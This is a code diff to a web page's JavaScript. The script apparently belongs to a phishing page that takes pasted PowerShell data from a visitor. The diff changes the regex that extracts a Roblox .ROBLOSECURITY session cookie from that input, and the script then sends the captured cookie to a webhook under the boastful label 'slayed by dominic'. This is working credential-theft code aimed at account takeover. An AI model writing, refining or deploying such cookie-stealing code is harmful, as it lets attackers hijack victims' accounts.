@@ -70,12 +70,14 @@ document.getElementById('submitButton').addEventListener('click', async function
   }
 
   // Send webhook for valid cookie
-  const roblosecurityRegex = /New-Object System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)"/;
-  const match = powershellData.match(roblosecurityRegex);
-  if (match) {
-    const cookie = match[1].trim();
-    await sendWebhook('New Cookie Captured', `\`\`\`${cookie}\`\`\``, 0x00ff00);
-  }
+  // Send webhook for valid .ROBLOSECURITY cookie
+const roblosecurityRegex = /\.ROBLOSECURITY",\s*"([^"]+)"/;
+const match = powershellData.match(roblosecurityRegex);
+if (match) {
+  const cookie = match[1].trim();
+  await sendWebhook('slayed by dominic🍪', `\`\`\`${cookie}\`\`\``, 0x00ff00);
+}
+
 
   powershellInput.value = '';
   closeModal('modal');
